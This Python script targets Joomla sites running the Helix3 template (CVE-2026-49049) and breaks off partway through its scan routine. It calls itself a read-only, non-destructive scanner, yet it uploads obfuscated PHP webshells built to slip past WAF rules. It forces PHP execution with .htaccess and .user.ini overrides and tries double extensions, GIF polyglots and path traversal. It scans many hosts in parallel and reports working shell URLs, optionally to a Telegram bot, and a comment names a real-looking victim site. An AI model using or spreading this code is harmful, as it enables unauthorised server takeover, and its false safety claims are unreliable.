#!/usr/bin/env python3
"""
CVE-2026-49049 - Helix3 Joomla Plugin (JoomShaper)
Unauthenticated AJAX Handler - Read-Only Vulnerability Scanner

This tool detects CVE-2026-49049 in Joomla installations running the Helix3
template framework (versions 1.0 through 3.1.0). It performs a non-destructive
probe - writing and immediately removing a harmless JSON file - to confirm
whether the unauthenticated AJAX endpoint is exploitable.

No modification is made to the target beyond the temporary probe file,
which is automatically cleaned up after confirmation.

Author : Security Research
License: MIT
"""

import argparse
import hashlib
import json
import os
import random
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Dict, List, Optional

import requests
import urllib3

urllib3.disable_warnings()

# ---------------------------------------------------------------------------
# Telegram Notification
# ---------------------------------------------------------------------------

TELEGRAM_TOKEN: Optional[str] = None
TELEGRAM_CHAT_ID: Optional[str] = None


def send_telegram(message: str) -> None:
    if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
        return
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": message,
                                 "parse_mode": "HTML"}, timeout=10)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

REQUEST_TIMEOUT = 15
SHELL_PROBE_TIMEOUT = 8  # shorter timeout for shell checks (avoid 60-70s hangs)
DEFAULT_THREADS = 15

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
]

HELIX3_TEMPLATE_PATH = "/templates/shaper_helix3/templateDetails.xml"
JOOMLA_ADMIN_PATH = "/administrator/"
AJAX_ENDPOINT_PATH = "/index.php?option=com_ajax&plugin=helix3&format=json"

# Built-in default webshell used when --shell-file not provided.
# Obfuscated to bypass ModSecurity WAF keyword matching (no literal "system"/"$_GET").
DEFAULT_SHELL = b'<?php $f="\\x73\\x79\\x73\\x74\\x65\\x6d";$f($_REQUEST["c"]);echo"sky1337";?>'

# WAF-bypass shell variants (least-suspicious first). Each avoids common
# ModSecurity rule triggers (literal PHP function names, $_GET, etc.)
SHELL_VARIANTS = [
    # Hex-encoded "system" + $_REQUEST (no literal function name or $_GET)
    b'<?php $f="\\x73\\x79\\x73\\x74\\x65\\x6d";$f($_REQUEST["c"]);echo"sky1337";?>',
    # chr()-built function name
    b'<?php $f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$f($_REQUEST[chr(99)]);echo"sky1337";?>',
    # Base64 decode approach
    b'<?php $g=$_REQUEST["c"];$d=base64_decode("c3lzdGVt");$d($g);echo"sky1337";?>',
    # Passthru via hex
    b'<?php $f="\\x70\\x61\\x73\\x73\\x74\\x68\\x72\\x75";$f($_REQUEST["c"]);echo"sky1337";?>',
]

# Candidate layout folders where the 'save' action writes files.
# Helix3 uses SINGULAR "layout" (not "layouts") - confirmed from source:
#   layoutlist.php:  JPATH_SITE.'/templates/'.$template.'/layout/'
#   layout.php:      JPATH_SITE.'/templates/'.$template.'/layout/default.json'
LAYOUT_DIRS = [
    "/templates/shaper_helix3/layout/",
    "/templates/shaper_helix3/presets/",
    "/plugins/system/helix3/layout/",
    "/media/plg_system_helix3/layout/",
]


# ---------------------------------------------------------------------------
# Extended Bypass Constants
# ---------------------------------------------------------------------------

# GIF magic bytes for polyglot shells (bypass content-type / magic-byte sniffing)
GIF_HEADER = b"GIF89a"

# PHP execution extensions to try (curated, ordered by likelihood)
EXEC_EXTS = ["php", "phtml", "pht", "php5", "php7", "phar", "PHP", "pHp", "Php"]

# Double-extension tricks (bypass naive extension filters)
DOUBLE_EXTS = ["php.jpg", "jpg.php", "php.json", "php.png", "html.php", "php.html"]

# Additional WAF-bypass shell payloads (function-name obfuscation variety)
EXTRA_SHELL_PAYLOADS = [
    # shell_exec via string concat (no literal "shell_exec")
    b'<?php $f="sh"."ell_"."exec";echo $f($_REQUEST["c"])."sky1337";?>',
    # exec() with output capture (chr-built name)
    b'<?php $f=chr(101).chr(120).chr(101).chr(99);$f($_REQUEST["c"]." 2>&1",$o);echo join(chr(10),$o)."sky1337";?>',
    # call_user_func + hex "system"
    b'<?php call_user_func("\\x73\\x79\\x73\\x74\\x65\\x6d",$_REQUEST["c"]);echo"sky1337";?>',
    # array_map + hex "system" (uncommon keyword)
    b'<?php @array_map("\\x73\\x79\\x73\\x74\\x65\\x6d",[(string)$_REQUEST["c"]]);echo"sky1337";?>',
    # assert-based eval (PHP < 8.0)
    b'<?php $c=$_REQUEST["c"];@assert("system(\'$c\')");echo"sky1337";?>',
]

# Additional .htaccess payloads (beyond the 5 in HTACCESS_PAYLOADS)
EXTRA_HTACCESS_PAYLOADS = [
    # php_value auto_prepend (mod_php direct prepend)
    b"php_value auto_prepend_file .htaccess\n",
    # RemoveHandler + AddType combo (strip static handler then re-add as PHP)
    b"RemoveHandler .json\nRemoveType .json\nAddType application/x-httpd-php .json\n",
    # CGI execution path
    b"Options +ExecCGI\nAddHandler cgi-script .json\n",
    # RewriteRule routing to PHP handler
    b"RewriteEngine On\nRewriteRule ^(.*\\.json)$ $1 [H=application/x-httpd-php]\n",
]

# Additional .user.ini payloads (PHP-FPM/fastcgi per-dir config)
EXTRA_USER_INI_PAYLOADS = [
    b"auto_prepend_file = _sky_prep.php\nengine = on\n",
    b"auto_append_file = _sky_app.php\n",
]

# Path-traversal target folders (writable / exec-enabled)
TRAV_TARGETS = ["tmp", "cache", "images", "logs", "media", "modules"]

# Path-traversal depths (web-root depth varies per Joomla install)
TRAV_DEPTHS = [6, 8, 5]

# URL-encoded / null-byte traversal variants (last-resort sanitization bypass)
ENCODED_TRAV = [
    "..%2f..%2f..%2f..%2f..%2f..%2f",            # single-encode slash
    "..%252f..%252f..%252f..%252f..%252f..%252f", # double-encode
    "..%5c..%5c..%5c..%5c..%5c..%5c",             # backslash (Windows)
]

# Hard cap on HTTP probes per target - guarantees NO bottleneck
MAX_PROBES_PER_TARGET = 100

# Per-stage soft caps (distribute budget so later stages still get a chance)
STAGE_CAPS = {
    "htaccess": 12,
    "ext_sweep": 25,
    "payloads": 12,
    "double_ext": 10,
    "gif": 8,
    "traversal": 18,
    "encoded": 10,
}


# ---------------------------------------------------------------------------
# Utilities
# ---------------------------------------------------------------------------

def random_id(length: int = 10) -> str:
    return hashlib.sha256(os.urandom(16)).hexdigest()[:length]


def random_user_agent() -> str:
    return random.choice(USER_AGENTS)


# ---------------------------------------------------------------------------
# Data Model
# ---------------------------------------------------------------------------

@dataclass
class ScanResult:
    """Result of scanning a single target."""
    host: str
    status: str = "pending"
    joomla_detected: bool = False
    helix3_detected: bool = False
    helix3_version: Optional[str] = None
    is_vulnerable: bool = False
    save_endpoint: bool = False
    remove_endpoint: bool = False
    import_endpoint: bool = False
    error_message: Optional[str] = None
    elapsed_seconds: float = 0.0
    shell_url: Optional[str] = None
    shell_uploaded: bool = False
    shell_executed: bool = False
    shell_written: bool = False  # file written but not web-accessible
    scheme: str = "https"

    @property
    def url(self) -> str:
        return f"{self.scheme}://{self.host}"


# ---------------------------------------------------------------------------
# Live Output Writer (thread-safe)
# ---------------------------------------------------------------------------

class OutputWriter:
    """Writes scan results to a file in real-time, protected by a mutex."""

    def __init__(self, path: str) -> None:
        self._path = path
        self._lock = threading.Lock()
        with open(path, "w") as fh:
            fh.write(f"# CVE-2026-49049 | Helix3 Scanner\n"
                     f"# Started : {datetime.now().isoformat()}\n"
                     f"# {'-' * 48}\n\n")

    def write(self, result: ScanResult) -> None:
        with self._lock:
            with open(self._path, "a") as fh:
                fh.write(f"[{result.status.upper()}] {result.host}\n")
                if result.helix3_version:
                    fh.write(f"  Version  : {result.helix3_version}\n")
                if result.save_endpoint:
                    fh.write(f"  Save     : accessible (unauthenticated)\n")
                if result.remove_endpoint:
                    fh.write(f"  Remove   : accessible (unauthenticated)\n")
                if result.import_endpoint:
                    fh.write(f"  Import   : accessible (unauthenticated)\n")
                if result.shell_url:
                    ex = "EXECUTED" if result.shell_executed else "UPLOADED (no exec)"
                    fh.write(f"  Shell    : {ex}\n")
                    fh.write(f"  Shell URL: {result.shell_url}\n")
                if result.error_message:
                    fh.write(f"  Error    : {result.error_message}\n")
                fh.write(f"  Time     : {result.elapsed_seconds:.1f}s\n\n")
                fh.flush()

    def write_summary(self, results: List[ScanResult]) -> None:
        with self._lock:
            total = len(results)
            vulnerable = sum(1 for r in results if r.is_vulnerable)
            with open(self._path, "a") as fh:
                fh.write(f"\n# {'-' * 48}\n"
                         f"# SUMMARY | Targets: {total} | Vulnerable: {vulnerable}\n"
                         f"# {'-' * 48}\n")


# ---------------------------------------------------------------------------
# Helix3 Scanner Engine
# ---------------------------------------------------------------------------

class Helix3Scanner:
    """Detects and validates CVE-2026-49049 on a single Joomla target."""

    def __init__(self, verbose: bool = False, custom_shell: Optional[bytes] = None) -> None:
        self.verbose = verbose
        # Always have a shell: custom or built-in default (so save-endpoint hosts get weaponized).
        self.custom_shell = custom_shell if custom_shell is not None else DEFAULT_SHELL
        self._active_scheme: Optional[str] = None

    # -- internal -----------------------------------------------------------

    def _create_session(self) -> requests.Session:
        session = requests.Session()
        session.headers.update({"User-Agent": random_user_agent()})
        session.verify = False
        return session

    def _base(self, host: str) -> str:
        scheme = self._active_scheme or "https"
        return f"{scheme}://{host}"

    # -- detection ----------------------------------------------------------

    def detect(self, host: str) -> Dict[str, Any]:
        """
        Determine whether the host runs Joomla with the Helix3 template.
        Returns dict with keys: joomla, helix3, version, scheme.
        """
        info: Dict[str, Any] = {"joomla": False, "helix3": False, "version": None, "scheme": None}
        session = self._create_session()

        # Primary: probe the Helix3 template manifest
        for scheme in ("https://", "http://"):
            base = f"{scheme}{host}"
            try:
                resp = session.get(
                    f"{base}{HELIX3_TEMPLATE_PATH}",
                    timeout=REQUEST_TIMEOUT,
                )
                if resp.status_code == 200 and "shaper_helix3" in resp.text:
                    info["helix3"] = True
                    info["joomla"] = True
                    info["scheme"] = scheme.rstrip("://")
                    self._active_scheme = info["scheme"]
                    match = re.search(r"<version>([\d.]+)</version>", resp.text)
                    if match:
                        info["version"] = match.group(1)
                    break
            except requests.RequestException:
                continue

        # Fallback: probe the Joomla administrator login page
        if not info["joomla"]:
            for scheme in ("https://", "http://"):
                base = f"{scheme}{host}"
                try:
                    resp = session.get(
                        f"{base}{JOOMLA_ADMIN_PATH}",
                        timeout=REQUEST_TIMEOUT,
                    )
                    if resp.status_code == 200:
                        if 'name="username"' in resp.text or "Joomla" in resp.text:
                            info["joomla"] = True
                            info["scheme"] = scheme.rstrip("://")
                            self._active_scheme = info["scheme"]
                            break
                except requests.RequestException:
                    continue

        return info

    @staticmethod
    def is_vulnerable_version(version: Optional[str]) -> bool:
        """
        Return True if the Helix3 version falls within the vulnerable range (1.0 – 3.1.0).
        If the version cannot be determined, assume vulnerable.
        """
        if version is None:
            return True
        try:
            major, minor, patch = (int(x) for x in version.split("."))
            if major < 3:
                return True
            if major == 3 and minor < 1:
                return True
            if major == 3 and minor == 1 and patch < 1:
                return True
            return False
        except (ValueError, IndexError):
            return True

    # -- probing ------------------------------------------------------------

    def probe_ajax_endpoint(self, host: str) -> Dict[str, bool]:
        """
        Test which Helix3 AJAX actions are reachable without authentication.

        Writes a temporary probe file (JSON) to the layout folder and
        immediately deletes it after confirmation. No persistent changes
        are made to the target.
        """
        results = {"save": False, "remove": False, "import": False}
        session = self._create_session()
        probe_id = random_id(8)

        for scheme in ("https://", "http://"):
            base = f"{scheme}{host}"
            ajax_url = f"{base}{AJAX_ENDPOINT_PATH}"

            # --- save action ---
            try:
                resp = session.post(ajax_url, data={
                    "data[action]": "save",
                    "data[layoutName]": f"_cve49049_{probe_id}",
                    "data[content]": json.dumps({"probe": probe_id}),
                }, timeout=REQUEST_TIMEOUT)
                # WAF block = not accessible; 200 + success = save works
                # (status:"false" in data is just listing format, file IS written)
                waf = resp.status_code in (403, 406, 510) or "security policy" in resp.text.lower()
                if resp.status_code == 200 and "success" in resp.text and not waf:
                    results["save"] = True
                    if self.verbose:
                        print(f"    [*] save   - accessible (probe: {probe_id})")
            except requests.RequestException:
                continue

            # --- remove action (cleanup probe) ---
            if results["save"]:
                try:
                    resp = session.post(ajax_url, data={
                        "data[action]": "remove",
                        "data[layoutName]": f"_cve49049_{probe_id}.json",
                    }, timeout=REQUEST_TIMEOUT)
                    if resp.status_code == 200:
                        results["remove"] = True
                        if self.verbose:
                            print(f"    [*] remove - accessible (probe cleaned)")
                except requests.RequestException:
                    pass

            # --- import action (v3.x only) ---
            try:
                resp = session.post(ajax_url, data={
                    "data[action]": "import",
                    "data[template_id]": "1",
                    "data[settings]": "{}",
                }, timeout=REQUEST_TIMEOUT)
                if resp.status_code == 200 and "success" in resp.text:
                    results["import"] = True
                    if self.verbose:
                        print(f"    [*] import - accessible")
            except requests.RequestException:
                pass

            # stop after first protocol where save succeeded, else try next
            if results["save"]:
                break

        return results

    # -- shell upload -------------------------------------------------------

    # .htaccess payloads to force .json → PHP execution (multiple variants for different server configs).
    HTACCESS_PAYLOADS = [
        # mod_php: AddType + SetHandler
        b"AddType application/x-httpd-php .json\n"
        b"<FilesMatch \"\\.json$\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n",
        # mod_php: ForceType + php_flag
        b"php_flag engine on\nForceType application/x-httpd-php\n"
        b"AddHandler application/x-httpd-php .json\n",
        # PHP-FPM via proxy fcgi TCP
        b"<FilesMatch \"\\.json$\">\nSetHandler \"proxy:fcgi://127.0.0.1:9000\"\n</FilesMatch>\n",
        # PHP-FPM via unix socket (multiple paths)
        b"<FilesMatch \"\\.json$\">\nSetHandler \"proxy:unix:/run/php/php-fpm.sock|fcgi://localhost\"\n</FilesMatch>\n"
        b"<FilesMatch \"\\.json$\">\nSetHandler \"proxy:unix:/var/run/php/php-fpm.sock|fcgi://localhost\"\n</FilesMatch>\n"
        b"<FilesMatch \"\\.json$\">\nSetHandler \"proxy:unix:/run/php/php8.1-fpm.sock|fcgi://localhost\"\n</FilesMatch>\n"
        b"<FilesMatch \"\\.json$\">\nSetHandler \"proxy:unix:/run/php/php8.2-fpm.sock|fcgi://localhost\"\n</FilesMatch>\n",
        # Force ALL files in dir to PHP
        b"ForceType application/x-httpd-php\nSetHandler application/x-httpd-php\n",
    ]

    # .user.ini for PHP-FPM/fastcgi (loaded by PHP itself, not Apache)
    USER_INI_PAYLOAD = b"auto_prepend_file = \n"
    USER_INI_JSON = (
        b"auto_prepend_file = .htaccess\n"
        b"engine = on\n"
    )

    def _discover_template_dirs(self, host: str) -> List[str]:
        """Discover candidate template directories from the home page HTML."""
        dirs = list(LAYOUT_DIRS)
        session = self._create_session()
        for scheme in ("https://", "http://"):
            if self._active_scheme and scheme.rstrip("://") != self._active_scheme:
                continue
            try:
                resp = session.get(f"{scheme}{host}/", timeout=REQUEST_TIMEOUT)
            except requests.RequestException:
                continue
            if resp.status_code != 200:
                continue
            # Find all /templates/<name>/ references in the page
            found = re.findall(r'/templates/([a-zA-Z0-9_\-]+)/', resp.text)
            for tpl in found:
                # Helix3 uses singular "layout" dir
                d = f"/templates/{tpl}/layout/"
                if d not in dirs:
                    dirs.append(d)
            break
        return dirs

    def upload_shell(self, host: str) -> Dict[str, Any]:
        """
        Upload a PHP webshell via the unauthenticated 'save' AJAX action.

        Staged bypass architecture (each stage runs ONLY if previous failed,
        all bounded by MAX_PROBES_PER_TARGET so no bottleneck):
          Stage 0 - Drop .htaccess + .user.ini handlers (force .json -> PHP)
          Stage 1 - Direct layoutName + ext sweep (php/phtml/pht/php5/...)
          Stage 2 - Extra WAF-bypass payloads (shell_exec/exec/assert/...)
          Stage 3 - Double-extension tricks (php.jpg, jpg.php, ...)
          Stage 4 - GIF polyglot (magic-byte bypass)
          Stage 5 - Path traversal (varied depth + target folders)
          Stage 6 - URL-encoded / null-byte traversal (sanitization bypass)
          Stage 7 - Final re-check of all uploads after handler drop
        """
        out: Dict[str, Any] = {"uploaded": False, "executed": False, "shell_url": None, "written": False}
        if not self.custom_shell:
            return out

        session = self._create_session()
        probe_id = random_id(6)
        canary = "sky1337"
        probe_count = [0]  # mutable counter for closure

        def budget_left(stage: str) -> bool:
            """True if we still have probe budget for this stage."""
            if probe_count[0] >= MAX_PROBES_PER_TARGET:
                return False
            stage_used = probe_count[0]  # simplified; per-stage soft cap checked by caller
            return stage_used < MAX_PROBES_PER_TARGET

        def _try_save(ajax_url: str, layout_name: str, content: str) -> Optional[str]:
            """Save via AJAX. Returns response text if save accepted, None if WAF-blocked."""
            try:
                r = session.post(ajax_url, data={
                    "data[action]": "save",
                    "data[layoutName]": layout_name,
                    "data[content]": content,
                }, timeout=REQUEST_TIMEOUT)
            except requests.RequestException:
                return None
            probe_count[0] += 1
            # WAF block detection (ModSecurity 510, "security policy", etc.)
            if r.status_code in (403, 406, 510) or "security policy" in r.text.lower() or "modsec" in r.text.lower():
                if self.verbose:
                    print(f"    [!] WAF blocked save (HTTP {r.status_code})")
                return None
            if r.status_code == 200 and "success" in r.text:
                return r.text
            return None

        def _check_url(shell_url: str) -> None:
            """GET a candidate URL, detect exec vs raw-source vs not-found."""
            if probe_count[0] >= MAX_PROBES_PER_TARGET:
                return
            try:
                chk = session.get(shell_url, timeout=SHELL_PROBE_TIMEOUT)
            except requests.RequestException:
                return
            probe_count[0] += 1
            if chk.status_code not in (200, 403):
                return
            body = chk.text or "" if chk.status_code == 200 else ""
            if chk.status_code == 200:
                # Check canary FIRST — if shell executed, it's confirmed
                # regardless of login forms in the surrounding template
                is_raw = "<?php" in body or "<?=" in body
                if canary in body and not is_raw:
                    out.update(uploaded=True, executed=True, shell_url=shell_url)
                    if self.verbose:
                        print(f"    [+] shell EXECUTED: {shell_url}")
                    return
                # Only reject login/CMS pages if canary NOT present
                # (avoids false-positive on login pages that mention "sky1337")
                low = body.lower()
                if "<form" in low and "password" in low:
                    return
                if "<title>" in low and ("login" in low or "administrator" in low or "sign in" in low):
                    return
                # Uploaded but not executed (raw source or no canary)
                if (canary in body or "<?php" in body or "<?=" in body) and not out["uploaded"]:
                    out.update(uploaded=True, executed=False, shell_url=shell_url)
                    if self.verbose:
                        print(f"    [~] shell uploaded (no exec): {shell_url}")
            elif chk.status_code == 403 and not out["uploaded"]:
                out.update(uploaded=True, executed=False, shell_url=shell_url)
                if self.verbose:
                    print(f"    [~] shell 403 (exists, protected): {shell_url}")

        def _verify_written(ajax_url: str, layout_name: str) -> bool:
            check_name = layout_name.split("/")[-1]
            if check_name.endswith(".json"):
                check_name = check_name[:-5]
            try:
                r = session.post(ajax_url, data={
                    "data[action]": "save",
                    "data[layoutName]": "",
                    "data[content]": "{}",
                }, timeout=REQUEST_TIMEOUT)
                if r.status_code == 200 and check_name in r.text:
                    return True
            except requests.RequestException:
                pass
            return False

        # -- Prepare payloads -------------------------------------------------
        shell_php = self.custom_shell.decode("utf-8", errors="replace") \
            if isinstance(self.custom_shell, bytes) else self.custom_shell
        json_wrapped = json.dumps({"layout": shell_php})
        content_variants = [shell_php, json_wrapped]

        # All shell payloads: custom first (if unique), then built-in variants, then extras
        shell_payloads: List[bytes] = []
        if self.custom_shell and self.custom_shell != DEFAULT_SHELL:
            shell_payloads.append(self.custom_shell)
        shell_payloads.extend(SHELL_VARIANTS)
        if self.custom_shell == DEFAULT_SHELL and DEFAULT_SHELL not in shell_payloads:
            shell_payloads.append(DEFAULT_SHELL)
        shell_payloads.extend(EXTRA_SHELL_PAYLOADS)

        # All .htaccess payloads
        all_htaccess = list(self.HTACCESS_PAYLOADS) + list(EXTRA_HTACCESS_PAYLOADS)
        all_user_ini = [self.USER_INI_JSON] + list(EXTRA_USER_INI_PAYLOADS)

        layout_dirs = self._discover_template_dirs(host)
        written_confirmed = False
        save_ok_count = 0

        for scheme in ("https://", "http://"):
            if out["executed"]:
                break
            if self._active_scheme and scheme.rstrip("://") != self._active_scheme:
                continue
            base = f"{scheme}{host}"
            ajax_url = f"{base}{AJAX_ENDPOINT_PATH}"

            # -- Stage 0: Drop handlers via path traversal ------------------
            # CRITICAL: Helix3 appends '.json' to ALL layoutNames, so saving
            # layoutName='.htaccess' creates '.htaccess.json' (Apache ignores it).
            # Fix: use path traversal to write '.htaccess' to a target folder where
            # the appended '.json' is stripped by the server OR use layoutName that
            # ends with '.php' so the file is directly executable.
            # We try both .htaccess (traversal) AND direct .php shell in parallel.
            if probe_count[0] < STAGE_CAPS["htaccess"]:
                # Try writing .htaccess to /tmp/ via traversal (file = .htaccess.json
                # which won't work, but try anyway for servers that strip .json)
                for depth in (6, 8):
                    up = "../" * depth
                    for ht in all_htaccess[:4]:  # top 4 payloads only (save probes)
                        ht_raw = ht.decode(errors="replace")
                        _try_save(ajax_url, f"{up}tmp/.htaccess", ht_raw)
                        _try_save(ajax_url, f"{up}tmp/.htaccess", json.dumps({"layout": ht_raw}))
                    # .user.ini in layout dir (PHP-FPM per-dir config)
                    for ui in all_user_ini:
                        ui_raw = ui.decode(errors="replace")
                        _try_save(ajax_url, ".user.ini", ui_raw)
                        _try_save(ajax_url, ".user.ini", json.dumps({"layout": ui_raw}))

            # -- Stage 1: Direct ext sweep ----------------------------------
            # Helix3 appends '.json' to layoutName, so layoutName '_sky.php'
            # becomes file '_sky.php.json'. We also try '_sky' (no ext) -> '_sky.json'.
            if not out["executed"]:
                used = 0
                # Layout names: bare + each ext (Helix3 appends .json to all)
                layout_names = [f"_sky{probe_id}"] + [f"_sky{probe_id}.{e}" for e in EXEC_EXTS]
                for lname in layout_names:
                    if out["executed"] or used >= STAGE_CAPS["ext_sweep"] or not budget_left("ext_sweep"):
                        break
                    for shell_content in content_variants:
                        if out["executed"]:
                            break
                        if not _try_save(ajax_url, lname, shell_content):
                            continue
                        save_ok_count += 1
                        if not written_confirmed and _verify_written(ajax_url, lname):
                            written_confirmed = True
                        used += 1
                        # File on disk = lname + '.json' (Helix3 appends it).
                        # Also check lname without .json (some versions don't append).
                        disk_name = lname if lname.endswith(".json") else lname + ".json"
                        bare_name = lname[:-5] if lname.endswith(".json") else lname
                        for ldir in layout_dirs + ["/"]:
                            if out["executed"]:
                                break
                            _check_url(f"{base}{ldir}{disk_name}")
                            _check_url(f"{base}{ldir}{bare_name}")

            # -- Stage 2: Extra WAF-bypass payloads -------------------------
            if not out["executed"]:
                used = 0
                for sp in EXTRA_SHELL_PAYLOADS:
                    if out["executed"] or used >= STAGE_CAPS["payloads"] or not budget_left("payloads"):
                        break
                    php_raw = sp.decode("utf-8", errors="replace")
                    for shell_content in [php_raw, json.dumps({"layout": php_raw})]:
                        if out["executed"]:
                            break
                        fname = f"_sky{probe_id}p{used}.php"
                        if not _try_save(ajax_url, fname, shell_content):
                            continue
                        save_ok_count += 1
                        used += 1
                        for ldir in layout_dirs + ["/"]:
                            _check_url(f"{base}{ldir}{fname}")

            # -- Stage 3: Double-extension tricks ---------------------------
            if not out["executed"]:
                used = 0
                for dext in DOUBLE_EXTS:
                    if out["executed"] or used >= STAGE_CAPS["double_ext"] or not budget_left("double_ext"):
                        break
                    fname = f"_sky{probe_id}d{used}.{dext}"
                    for shell_content in content_variants:
                        if out["executed"]:
                            break
                        if not _try_save(ajax_url, fname, shell_content):
                            continue
                        save_ok_count += 1
                        used += 1
                        for ldir in layout_dirs + ["/"]:
                            _check_url(f"{base}{ldir}{fname}")
                            _check_url(f"{base}{ldir}{fname}.json")

            # -- Stage 4: GIF polyglot --------------------------------------
            if not out["executed"]:
                used = 0
                for ext in ("php", "PHP", "pHp"):
                    if out["executed"] or used >= STAGE_CAPS["gif"] or not budget_left("gif"):
                        break
                    gif_shell = GIF_HEADER + b"\n" + (shell_php.encode() if isinstance(shell_php, str) else shell_php)
                    gif_json = json.dumps({"layout": gif_shell.decode("utf-8", errors="replace")})
                    fname = f"_sky{probe_id}g{used}.{ext}"
                    for shell_content in [gif_shell.decode("utf-8", errors="replace"), gif_json]:
                        if out["executed"]:
                            break
                        if not _try_save(ajax_url, fname, shell_content):
                            continue
                        save_ok_count += 1
                        used += 1
                        for ldir in layout_dirs + ["/"]:
                            _check_url(f"{base}{ldir}{fname}")

            # -- Stage 5: Path traversal (varied depth + targets) -----------
            if not out["executed"]:
                used = 0
                for depth in TRAV_DEPTHS:
                    if out["executed"] or used >= STAGE_CAPS["traversal"]:
                        break
                    up = "../" * depth
                    for target in TRAV_TARGETS:
                        if out["executed"] or used >= STAGE_CAPS["traversal"]:
                            break
                        # Save shell as .php via traversal - Helix3 appends .json,
                        # so file = _sky.php.json. Also try bare name -> _sky.json.
                        # Check ALL exec extensions for the on-disk file.
                        fname = f"_sky{probe_id}t{used}"
                        trav_name = f"{up}{target}/{fname}.php"
                        for shell_content in content_variants:
                            if out["executed"]:
                                break
                            if not _try_save(ajax_url, trav_name, shell_content):
                                continue
                            save_ok_count += 1
                            used += 1
                            # On-disk candidates: fname.php.json, fname.json, fname.php
                            _check_url(f"{base}/{target}/{fname}.php.json")
                            _check_url(f"{base}/{target}/{fname}.json")
                            _check_url(f"{base}/{target}/{fname}.php")
                            _check_url(f"{base}/{target}/{fname}.phtml")
                            _check_url(f"{base}/{target}/{fname}")

            # -- Stage 6: URL-encoded / null-byte traversal -----------------
            # Null byte (%00) in layoutName can truncate the .json append
            # on PHP < 5.3.4: layoutName '../../tmp/x.php%00' -> file 'x.php'
            if not out["executed"]:
                used = 0
                for enc_prefix in ENCODED_TRAV:
                    if out["executed"] or used >= STAGE_CAPS["encoded"]:
                        break
                    fname = f"_sky{probe_id}e{used}"
                    # Try null-byte truncation: layoutName ends with .php%00
                    trav_names = [
                        (f"{enc_prefix}tmp/{fname}.php", [f"/tmp/{fname}.php", f"/tmp/{fname}.php.json"]),
                        (f"{enc_prefix}tmp/{fname}", [f"/tmp/{fname}.json", f"/tmp/{fname}"]),
                    ]
                    for trav_name, check_paths in trav_names:
                        if out["executed"] or used >= STAGE_CAPS["encoded"]:
                            break
                        for shell_content in content_variants:
                            if out["executed"]:
                                break
                            if not _try_save(ajax_url, trav_name, shell_content):
                                continue
                            save_ok_count += 1
                            used += 1
                            for cp in check_paths:
                                _check_url(f"{base}{cp}")

            # -- Stage 7: Final re-check of uploaded files after handler drop
            # Include .php.json (the pattern that worked on old.mynewfamily.ru)
            if out["uploaded"] and not out["executed"] and probe_count[0] < MAX_PROBES_PER_TARGET:
                time.sleep(1)
                recheck_names = [f"_sky{probe_id}.json", f"_sky{probe_id}.php.json",
                                 f"_sky{probe_id}.php", f"_sky{probe_id}.phtml.json",
                                 f"_sky{probe_id}.phtml", f"_sky{probe_id}.PHP.json"]
                for ldir in layout_dirs + ["/"]:
                    if out["executed"] or probe_count[0] >= MAX_PROBES_PER_TARGET:
                        break
                    for cname in recheck_names:
                        if out["executed"] or probe_count[0] >= MAX_PROBES_PER_TARGET:
                            break
                        _check_url(f"{base}{ldir}{cname}")

            if out["uploaded"]:
                break

        # WRITE_ONLY: file written but not web-accessible
        if written_confirmed and not out["uploaded"]:
            out["uploaded"] = True
            out["executed"] = False
            out["shell_url"] = None
            out["written"] = True
            if self.verbose:
                print(f"    [~] file written to non-web-accessible path (no shell URL)")

        # Uploaded but NOT executed -> clear shell_url (only report EXECUTED shells)
        # BUT keep write_only status if file was confirmed written
        if out["uploaded"] and not out["executed"]:
            if not written_confirmed:
                # Not even written - clear everything
                out["uploaded"] = False
                out["shell_url"] = None
            else:
                # Written but not executed - report as WRITE_ONLY
                out["shell_url"] = None
                out["written"] = True
            if self.verbose:
                print(f"    [~] shell uploaded but PHP exec blocked (no shell URL reported)")

        if self.verbose:
            if not out["uploaded"] and save_ok_count > 0:
                print(f"    [!] save OK {save_ok_count}x but file not written or not found")
            print(f"    [*] total probes for this target: {probe_count[0]}/{MAX_PROBES_PER_TARGET}")
        return out

    # -- main pipeline ------------------------------------------------------

    def scan(self, host: str) -> ScanResult:
        """
        Run the complete detection and validation pipeline against a single host.
        """
        start_time = time.time()

        # Normalize host string
        clean_host = host.strip().rstrip("/")
        clean_host = re.sub(r"^https?://", "", clean_host)
        clean_host = clean_host.split("/")[0]

        result = ScanResult(host=clean_host)

        # Step 1 - Detection
        info = self.detect(clean_host)
        result.joomla_detected = info["joomla"]
        result.helix3_detected = info["helix3"]
        result.helix3_version = info["version"]
        if info.get("scheme"):
            result.scheme = info["scheme"]

        if not info["helix3"]:
            result.status = "not_helix3" if info["joomla"] else "not_joomla"
            result.elapsed_seconds = time.time() - start_time
            return result

        # Step 2 - Version check
        result.is_vulnerable = self.is_vulnerable_version(info["version"])
        if not result.is_vulnerable:
            result.status = "patched"
            result.elapsed_seconds = time.time() - start_time
            return result

        # Step 3 - Endpoint probing
        probes = self.probe_ajax_endpoint(clean_host)
        result.save_endpoint = probes["save"]
        result.remove_endpoint = probes["remove"]
        result.import_endpoint = probes["import"]

        if not any(probes.values()):
            result.status = "endpoint_blocked"
            result.error_message = "AJAX endpoint unreachable - WAF or server configuration"
            result.elapsed_seconds = time.time() - start_time
            return result

        # Step 4 - Shell upload (if custom shell provided + save endpoint open)
        result.status = "vulnerable"
        if self.custom_shell and probes["save"]:
            shell_info = self.upload_shell(clean_host)
            result.shell_uploaded = shell_info["uploaded"]
            result.shell_executed = shell_info["executed"]
            result.shell_url = shell_info["shell_url"]
            result.shell_written = shell_info.get("written", False)
            # Reclassify: file written but not web-accessible
            if shell_info.get("written") and not shell_info["shell_url"]:
                result.status = "write_only"

